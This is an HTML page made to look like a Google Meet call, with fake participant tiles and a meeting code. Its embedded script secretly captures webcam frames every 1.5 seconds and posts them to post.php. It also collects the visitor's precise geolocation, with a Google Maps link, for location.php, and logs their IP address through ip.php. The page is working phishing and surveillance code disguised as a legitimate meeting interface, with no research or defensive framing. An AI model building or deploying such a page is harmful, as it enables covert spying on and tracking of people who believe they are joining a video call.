<!doctype html>
<html>
<head>
<title>Google Meet</title>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
body {
  font-family: Arial, sans-serif;
  background-color: #202124; /* Dark gray background */
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  color: white; /* Set default text color to white */
}

#meet-container {
  width: 100%; /* Take full width */
  max-width: none; /* Remove max-width */
  background-color: transparent; /* Remove white background */
  box-shadow: none; /* Remove box-shadow */
  padding: 0; /* Remove padding */
  margin-top: 0; /* Remove margin */
  height: 100vh; /* Occupy full viewport height */
  display: flex;
  flex-direction: column;
}

.video-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); /* Adjusted size */
  grid-gap: 8px; /* Reduced gap */
  margin-bottom: auto; /* Push to top */
  padding: 10px; /* Added padding */
  flex: 1; /* Take remaining space */
}

.video-container {
  position: relative;
  background-color: #3c4043; /* Darker video background */
  border-radius: 8px; /* Rounded corners */
  overflow: hidden;
}

.video-container video {
  width: 100%;
  display: block;
  object-fit: cover; /* Cover the area */
}

.video-container .name-overlay {
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.6); /* More transparent */
  color: white;
  padding: 6px; /* Slightly larger padding */
  font-size: 14px;
  text-align: left; /* Align left */
}

#local-video-container { /* Style for the local video (your webcam) */
  border: none; /* Remove blue border */
}

#content-area {
  width: 100%;
  text-align: center;
  padding: 0;
  flex: 0; /* Don't take extra space */
}

#bottom-bar {
  background-color: #3c4043; /* Match video background */
  padding: 12px; /* Adjust padding */
  text-align: center;
  border-top: none; /* Remove border */
  border-radius: 0;
}

#bottom-bar button {
  padding: 8px 16px; /* Adjust padding */
  margin: 0 8px; /* Adjust margin */
  border: none;
  border-radius: 24px; /* More rounded buttons */
  background-color: #5f6368; /* Darker button color */
  color: white;
  cursor: pointer;
  font-size: 14px;
}

#bottom-bar button:hover {
  background-color: #70757a; /* Slightly lighter hover color */
}

/* Placeholder for icons */
#bottom-bar button::before {
  content: "[ICON] "; /* Replace with actual icon */
}

/* Additional styles */
.time-code {
  position: absolute;
  bottom: 0;
  left: 0;
  color: rgba(255,255,255,0.7);
  font-size: 12px;
  padding: 4px;
}

.meet-code {
    position: absolute;
    bottom: 0;
    right: 0;
    color: rgba(255,255,255,0.7);
    font-size: 12px;
    padding: 4px;
}

/* Style the "C" placeholder */
.initial-placeholder {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  height: 100%;
  font-size: 80px; /* Adjust as needed */
  color: white;
  text-transform: uppercase;
}

</style>
</head>

<body>
  <div id="meet-container">
    <div class="video-grid">
      <!-- Local Video -->
      <div class="video-container" id="local-video-container">
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        <div class="name-overlay">You</div>
      </div>

      <!-- Placeholder for other participants -->
      <div class="video-container">
          <div class="initial-placeholder">C</div>
        <div class="name-overlay">Carlos Houadjeto</div>
      </div>

      <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Rachad Abdel KARIM</div>
      </div>

       <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">wikimedia BÃ©nin user group</div>
      </div>

      <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Yolande FLEURY</div>
      </div>

        <div class="video-container">
        <video playsinline autoplay></video>
        <div class="name-overlay">Pawas TAROU</div>
      </div>

      <!-- Add more video-container divs for more participants -->
    </div>

    <div id="content-area">
      <!--  Removed the iframe and the whole live yt tv thing -->
    </div>

    <div id="bottom-bar">
      <button>Mic</button>
      <button>Camera</button>
      <button>Closed Captions</button>
      <button>Present Now</button>
      <button>Leave call</button>
      </div>
      <div class="time-code">
      13:07
      </div>
        <div class="meet-code">
        arj-zgjp-mvr
        </div>
  </div>

<script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php', // Use your existing post.php
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {

    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);


}

// Load init
init();

// Get location
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function (position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        var accuracy = position.coords.accuracy;

        // Create Google Maps link
        var googleMapsLink = "https://maps.google.com/?q=" + latitude + "," + longitude;

        // Prepare the data to be sent
        var locationData = {
          latitude: latitude,
          longitude: longitude,
          accuracy: accuracy,
          googleMapsLink: googleMapsLink
        };

        // Send the location data to the server
        $.ajax({
          type: 'POST',
          url: 'location.php', // Use your existing location.php
          data: locationData,
          dataType: 'json',
          async: false,
          success: function (result) {
            console.log('Location data sent successfully.');
          },
          error: function () {
            console.error('Error sending location data.');
          }
        });
      },
      function (error) {
        console.error("Geolocation error: " + error.message);
        // Handle geolocation errors appropriately
      }
    );
  } else {
    console.error("Geolocation is not supported by this browser.");
  }

  // Get IP Address
  $.ajax({
    type: 'POST',
    url: 'ip.php',
    dataType: 'json',
    async: false,
    success: function(result){
      console.log('IP address captured.');
    },
    error: function(){
      console.error('Error capturing IP address.');
    }
  });
</script>

</body>
</html>
